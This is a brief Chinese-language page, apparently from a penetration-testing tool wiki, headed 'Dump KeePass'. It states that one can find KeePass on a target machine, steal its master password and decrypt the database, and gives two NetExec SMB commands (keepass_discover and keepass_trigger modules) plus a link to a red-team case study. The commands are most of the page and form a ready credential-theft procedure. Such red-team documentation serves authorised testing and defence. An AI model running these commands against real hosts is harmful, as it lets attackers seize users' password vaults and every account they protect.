# 导出 KeePass

你可以检查目标计算机上是否安装了 KeePass，然后窃取主密码并解密数据库！

```
$ NetExec smb <ip> -u user -p pass -M keepass_discover
$ NetExec smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
```

{% embed url="https://web.archive.org/web/20211017083926/http://www.harmj0y.net:80/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2" %}
